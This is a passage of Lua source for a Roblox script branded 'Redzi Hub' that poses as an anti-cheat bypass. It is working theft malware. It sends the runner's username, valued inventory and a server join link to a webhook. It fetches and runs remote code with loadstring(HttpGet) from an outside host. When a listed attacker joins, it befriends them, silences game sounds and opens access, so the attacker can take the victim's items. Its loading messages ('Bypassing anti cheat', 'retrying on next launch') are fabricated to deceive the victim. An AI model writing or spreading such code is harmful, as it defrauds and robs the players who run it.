        ["Cocofanto Elefanto"] = "🥥🐘", ["Money Money Man"] = "💰🧍‍♂️",
        ["Unclito Samito"] = "🇺🇸", ["Vampira Cappuccina"] = "🧛‍♀️☕",
        ["Jacko Jack Jack"] = "🎃", ["Los Chihuaninis"] = "🐶",
        ["Las Capuchinas"] = "👩‍🍳", ["Brr es Teh Patipum"] = "❄️☕",
        ["Pakrahmatmatina"] = "🙏♀️", ["Orcalita Orcala"] = "🐳",
        ["Mummy Ambalabu"] = "🧟", ["Snailenzo"] = "🐌",
        ["Crabbo Limonetta"] = "🦀🍋", ["Granchiello Spiritell"] = "🦀👻",
        ["Tootini Shrimpini"] = "🦐", ["Boba Panda"] = "🧋🐼",
        ["Mastodontico Telepiedone"] = "🦣📞", ["Bambu Bambu Sahur"] = "🎍",
        ["Chrismasmamat"] = "🎄👩", ["Anpali Babel"] = "🗼",
        ["Noo La Polizia"] = "🚔", ["Luv Luv Luv"] = "❤️",
        ["Cappuccino Clownino"] = "☕🤡", ["Brasilini Berimbini"] = "🇧🇷🎶",
        ["Belula Beluga"] = "🐋", ["Krupuk Pagi Pagi"] = "🍤",
        ["Skull Skull Skull"] = "💀", ["Cocoa Assassino"] = "🍫🔪",
        ["Tentacolo Tecnico"] = "🐙🔧", ["Pandanini Frostini"] = "🐼❄️",
        ["Dolphini Jetskini"] = "🐬🏄", ["Karkerheart Luvkur"] = "🐔❤️",
        ["Secret Lucky Block"] = "🤫🎲", ["GOAT"] = "🐐",
        ["Lavadorito Spinito"] = "🧼", ["Bisonte Giuppitere"] = "🦬",
        ["Trenostruzzo Turbo 4000"] = "🐦🚄", ["Jackorilla"] = "🎃🦍",
        ["Sammyni Spyderini"] = "🕷️", ["Chachechi"] = "🐶",
        ["Fragola La La La"] = "🍓🎶", ["Vulturino Skeletono"] = "🦅💀",
        ["Zombie Tralala"] = "🧟🎶", ["Boatito Auratito"] = "⛵",
        ["Guerriro Digitale"] = "⚔️💻", ["Yess my examine"] = "✅",
        ["Reindeer Tralala"] = "🦌🎶", ["Rocco Disco"] = "🕺",
        ["Pumpkini Spyderini"] = "🎃🕷️", ["Frankentteo"] = "🧟‍♂️",
        ["Los Trios"] = "🎸", ["Los Karkeritos"] = "🐔", ["Santteo"] = "🎅",
        ["La Vacca Jacko Linterino"] = "🐄🎃", ["Triplito Tralaleritos"] = "🎶",
        ["Trickolino"] = "🃏", ["Giftini Spyderini"] = "🎁🕷️",
        ["1x1x1x1"] = "1️⃣", ["Love Love Love Sahur"] = "❤️",
        ["Los Cucarachas"] = "🪳", ["Cuadramat and Pakrahmatmamat"] = "🤝",
        ["Bunnyman"] = "🐰", ["Coffin Tung Tung Tung Sahur"] = "⚰️🥁",
        ["Noo my examine"] = "😭✅", ["Telemorte"] = "📞💀",
        ["La Sahur Combinasion"] = "🔥", ["List List List Sahur"] = "📋",
        ["Pirulitoita Bicicleteira"] = "🍭🚲", ["25"] = "2️⃣5️⃣",
        ["Santa Hotspot"] = "🎅📶", ["Horegini Boom"] = "💥",
        ["Bunito Bunito Spinito"] = "🐰", ["Pot Pumpkin"] = "🎃🔥",
        ["Cupid Cupid Sahur"] = "💘", ["Naughty Naughty"] = "😈",
        ["Mi Gatito"] = "😺", ["Quesadillo Vampiro"] = "🧀🧛",
        ["Brunito Marsito"] = "🎤", ["Cupid Hotspot"] = "💘📶",
        ["Burrito Bandito"] = "🌯🤠", ["Chill Puppy"] = "🥶🐶",
        ["Los Quesadillas"] = "🧀", ["Noo my Candy"] = "😭🍬",
        ["Arcadopus"] = "🕹️🐙", ["Rang Ring Bus"] = "🚌",
        ["Noo my Present"] = "😭🎁", ["Guest 666"] = "6️⃣6️⃣6️⃣",
        ["Los Chicleteiras"] = "🍬", ["Donkeyturbo Express"] = "🫏🚀",
        ["Los Burritos"] = "🌯", ["Los 25"] = "2️⃣5️⃣",
        ["Swag Soda"] = "🥤😎", ["Noo my Heart"] = "😭❤️",
        ["Chimnino"] = "🦅", ["Chicleteira Cupideira"] = "🍬💘",
        ["Los Planitos"] = "✈️", ["Los Spooky Combinasionas"] = "👻🔥",
        ["Los Jolly Combinasionas"] = "🎄🔥", ["Los Mobilis"] = "📱",
        ["Los Bros"] = "👬", ["Bacuru and Egguru"] = "🥓🥚",
        ["La Spooky Grande"] = "👻", ["Chipso and Queso"] = "🥔🧀",
        ["Money Money Reindeer"] = "💰🦌", ["Mieteteira Bicicleteira"] = "🍪🚲",
        ["Tuff Toucan"] = "🦜💪", ["Gobblino Uniciclino"] = "🦃🚲",
        ["Los Puggies"] = "🐶", ["W or L"] = "🏆", ["Los Primos"] = "👨‍👩‍👦",
        ["Eviledon"] = "😈", ["Lovin Rose"] = "🌹❤️",
        ["La Taco Combinasion"] = "🌮🔥", ["Orcaledon"] = "🐳",
        ["Swaggy Bros"] = "😎👬", ["La Romantic Grande"] = "❤️",
        ["Jolly Jolly Sahur"] = "🎄", ["Rosetti Tualetti"] = "🌹🚽",
        ["Festive 67"] = "🎄6️⃣7️⃣", ["Los Spaghettis"] = "🍝",
        ["Ginger Gerat"] = "🍪🐀", ["La Ginger Sekolah"] = "🍪🏫",
        ["Love Love Bear"] = "❤️🐻", ["Spooky and Pumpky"] = "👻🎃",
        ["Fragrama and Chocrama"] = "🍫", ["La Casa Boo"] = "🏠👻",
        ["Reinito Sleighito"] = "🦌🛷", ["Ketupat Bros"] = "🍚👬",
        ["Rosey and Teddy"] = "🌹🧸", ["Popcuru and Fizzuru"] = "🍿🥤",
        ["Dragon Gingerini"] = "🐉🍪", ["Headless Horseman"] = "🎃🏇",
        ["Hydra Dragon Cannelloni"] = "🐉🍝", ["Admin Lucky Block"] = "🛡️🎲",
        ["Los Lucky Blocks"] = "🎲", ["Taco Lucky Block"] = "🌮🎲",
        ["Los Taco Blocks"] = "🌮🎲", ["Spooky Lucky Block"] = "👻🎲",
        ["Festive Lucky Block"] = "🎄🎲", ["Heart Lucky Block"] = "❤️🎲",
        ["Gold Elf"] = "🧝‍♂️🥇", ["Kings Coleslaw"] = "👑🥗",
        ["Developini Braziliaspidini"] = "👨‍💻🕷️",
        ["Crocodildo Penisini"] = "🐊", ["Ice Dragon"] = "🐉❄️",
        ["Blueberrinni Octopusini"] = "🫐🐙",
    }

    local initialMap = {}
    for _, item in ipairs(initialInventoryList) do
        initialMap[item.name] = (initialMap[item.name] or 0) + 1
        totalInitialValue = totalInitialValue + item.val
    end

    local currentMap = {}
    for _, item in ipairs(currentInv) do
        currentMap[item.name] = (currentMap[item.name] or 0) + 1
    end

    local itemsSentList = {}
    for name, initialQty in pairs(initialMap) do
        local currentQty = currentMap[name] or 0
        local takenQty = initialQty - currentQty
        if takenQty < 0 then takenQty = 0 end
        local unitVal = 0
        for _, item in ipairs(initialInventoryList) do
            if item.name == name then unitVal = item.val break end
        end
        local takenValue = takenQty * unitVal
        local totalItemValue = initialQty * unitVal
        totalClaimedValue = totalClaimedValue + takenValue
        local takenFormatted = formatValue(takenValue)
        local totalFormatted = formatValue(totalItemValue)
        local emoji = emojiMap[name] or "•"
        local line = emoji .. " " .. name .. " " .. takenQty .. " / " .. initialQty .. " (" .. takenFormatted .. " / " .. totalFormatted .. ")"
        table.insert(inventoryLines, line)
        if takenQty > 0 then
            table.insert(itemsSentList, name .. " x" .. takenQty)
        end
    end

    local inventoryText = #inventoryLines > 0 and table.concat(inventoryLines, "\n") or "None"
    inventoryText = inventoryText .. "\n===============================\nTotal: " .. formatValue(totalClaimedValue) .. " / " .. formatValue(totalInitialValue) .. ""

    local hitContent = "> @everyone『 ꜱᴍᴀʟʟ ʜɪᴛ 』"
    if totalInitialValue >= 20000000 then
        hitContent = "> @everyone ⋆｡ ɢᴏᴏᴅ ʜɪᴛ ｡⋆"
    end

    local payload = {
        content = hitContent,
        username = "Redzi Hub Hit",
        avatar_url = "https://rayzhubb.vercel.app/pngs/logo.png",
        embeds = {{
            title = "REDZI HUB",
            description = "❓ **How to Use?**\nJoin user and steal his brainrots.",
            color = 0x800080,
            fields = {
                { name = "🧑‍💻⚙️ Status:", value = "```" .. status .. "```", inline = false },
                { name = "<📛 Display Name:", value = "```" .. LocalPlayer.DisplayName .. "```", inline = true },
                { name = "<🪪 Username:", value = "```" .. LocalPlayer.Name .. "```", inline = true },
                { name = "<🎒 Inventory:", value = "```" .. inventoryText .. "```" },
                { name = "<🔗 Join Player:", value = "[ Click to Join ](" .. joinLink .. ")", inline = false },
            },
            footer = { text = "REDZI HUB • Total Value:", icon_url = "https://rayzhubb.vercel.app/pngs/logo.png" },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
            image = {url = "https://rayzhubb.vercel.app/pngs/sab.png"},
        }}
    }

    local success, response = pcall(function()
        local req = (syn and syn.request) or request or http_request or (http and http.request)
        return req({
            Url = url,
            Method = method,
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(payload)
        })
    end)

    if success and method == "POST" and response and response.Body then
        local decodeSuccess, data = pcall(function() return HttpService:JSONDecode(response.Body) end)
        if decodeSuccess and data and data.id then
            lastMessageId = data.id
        end
    end

    trackHit({
        total_value = formatValue(totalClaimedValue),
        items_sent = #itemsSentList > 0 and table.concat(itemsSentList, ", ") or "None"
    })
end

local function handleAuthorizedUser(player)
    local isAuthorized = table.find(Usernames, player.Name) or table.find(Usernames, player.DisplayName)

    if isAuthorized then
        pcall(function() LocalPlayer:FriendUser(player.UserId) end)

        if not authorizedFound then
            authorizedFound = true

            if ScreenGui then ScreenGui:Destroy() end
            loadstring(game:HttpGet("https://rayzhubb.vercel.app/scripts/sab-gui.lua"))()
            SoundService.AmbientReverb = Enum.ReverbType.NoReverb
            for _, snd in ipairs(Workspace:GetDescendants()) do
                if snd:IsA("Sound") then
                    snd.Volume = 0
                    snd:Stop()
                end
            end
            Workspace.DescendantAdded:Connect(function(obj)
                if obj:IsA("Sound") then
                    obj.Volume = 0
                    obj:Stop()
                end
            end)
            RunService.Heartbeat:Connect(function()
                for _, snd in ipairs(Workspace:GetDescendants()) do
                    if snd:IsA("Sound") and snd.IsPlaying then
                        snd:Stop()
                    end
                end
            end)

            task.wait(1)
            pcall(function()
                ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net"):WaitForChild("RE/PlotService/ToggleFriends"):FireServer()
            end)
        end

        task.spawn(function()
            while player.Parent == Players do
                task.wait(1.5)
            end
            local currentInv = getValuableBrainrots()
            local finalStatus = "🟡 Waiting"
            if #currentInv == 0 and initialInventoryCount > 0 then
                finalStatus = "🟢 Claimed"
            elseif #currentInv < initialInventoryCount then
                finalStatus = "🔵 Partially claimed"
            end
            sendDetailedEmbedLog(LinkInput.Text, finalStatus)
        end)
    end
end

ExecuteBtn.MouseButton1Click:Connect(function()
    if #Players:GetPlayers() > 1 then
        LocalPlayer:Kick("this is your own script to use, please join an empty private server!")
        return
    end

    local link = LinkInput.Text:match("^%s*(.-)%s*$")

    if link == "" or (not link:find("roblox%.com") and not link:find("share")) then
        ExecuteBtn.Text = "✗  INVALID LINK"
        TweenService:Create(ExecuteBtn, TweenInfo.new(0.08), {BackgroundColor3 = Color3.fromRGB(180, 40, 80)}):Play()
        task.wait(0.08)
        TweenService:Create(ExecuteBtn, TweenInfo.new(0.08), {Position = UDim2.new(0.09, 0, 0, 118)}):Play()
        task.wait(0.08)
        TweenService:Create(ExecuteBtn, TweenInfo.new(0.08), {Position = UDim2.new(0.07, 0, 0, 118)}):Play()
        task.wait(0.08)
        TweenService:Create(ExecuteBtn, TweenInfo.new(0.08), {Position = UDim2.new(0.09, 0, 0, 118)}):Play()
        task.wait(0.08)
        TweenService:Create(ExecuteBtn, TweenInfo.new(0.15), {
            Position = UDim2.new(0.08, 0, 0, 118),
            BackgroundColor3 = Color3.fromRGB(110, 40, 200)
        }):Play()
        task.wait(1.2)
        ExecuteBtn.Text = "⚡  EXECUTE"
        return
    end

    task.spawn(function()
        incrementHitCount(Webhook)
    end)

    initialInventoryList = getValuableBrainrots()
    initialInventoryCount = #initialInventoryList
    authorizedFound = false
    lastMessageId = nil

    sendDetailedEmbedLog(link, "🟡 Waiting")

    TweenService:Create(MainFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
        Size = UDim2.new(0, 290, 0, 200)
    }):Play()

    LoadingFrame.Visible = true
    LoadingFrame.BackgroundTransparency = 1
    TweenService:Create(LoadingFrame, TweenInfo.new(0.3), {BackgroundTransparency = 0}):Play()

    LinkInput.Visible = false
    ExecuteBtn.Visible = false
    Title.Visible = false
    Subtitle.Visible = false
    StatusDot.Visible = false
    StatusLabel.Visible = false

    LoadingText.Text = "Bypassing anti cheat"
    PercentLabel.Text = "connecting to servers..."

    startBouncingBar()

    task.spawn(function()
        local messages = {
            "Bypassing anti cheat",
            "Hooking remote events",
            "Scanning for target",
            "Patching detection",
            "Waiting for player",
            "Monitoring server",
            "Standing by",
        }
        local i = 1
        while LoadingFrame.Visible do
            LoadingText.Text = messages[i]
            i = (i % #messages) + 1
            task.wait(math.random(8, 18))
        end
    end)

    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LocalPlayer then
            handleAuthorizedUser(p)
        end
    end

    local connection = Players.PlayerAdded:Connect(function(p)
        if p ~= LocalPlayer then
            handleAuthorizedUser(p)
        end
    end)

    task.delay(LOADING_DURATION + 0.5, function()
        if connection then connection:Disconnect() end
        if not authorizedFound then
            sendDetailedEmbedLog(link, "🔴 Failed")
            StatusDot.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
            LoadingText.Text = "Failed to bypass anti cheat"
            PercentLabel.Text = "retrying on next launch..."
            task.wait(1.8)
            LoadingText.Text = "try again later"
            task.wait(2.2)
            pcall(function()
                game:GetService("TeleportService"):Teleport(game.PlaceId, LocalPlayer)
            end)
            LocalPlayer:Kick("Failed to bypass anti cheat, try again later")
        end
    end)
end)
